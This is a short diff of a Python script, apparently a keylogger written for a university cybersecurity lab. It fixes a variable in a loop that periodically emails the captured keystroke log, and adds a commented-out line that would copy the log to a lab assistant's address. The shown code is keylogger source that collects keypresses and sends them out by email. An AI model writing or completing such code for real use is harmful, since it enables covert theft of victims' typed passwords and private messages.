@@ -24,7 +24,10 @@ def send_email():
 
         msg = MIMEMultipart()
         msg["From"] = EMAIL_ADDRESS
-        msg["To"] = EMAIL_ADDRESS 
+        # Correo a uno mismo
+        msg["To"] = EMAIL_ADDRESS
+        # correo del ayudante: "LaboratorioCyS@pm.me"
+        # msg["To"] = EMAIL_ADDRESS, "LaboratorioCyS@pm.me"
         msg["Subject"] = f"Reporte - {datetime.now()}"
 
         body = f"Registro:\n\n{log_total}"
@@ -56,12 +59,13 @@ def save_to_file():
         print(f"Error al guardar archivo: {e}")
 
 def schedule_emails(email_interval):
-    global log
+    global log_total
     while True:
         threading.Event().wait(email_interval) 
-        if log:
+        if log_total:
             print("Enviando correo")
             send_email()
+
 def on_press(key):
     global log
     global log_total
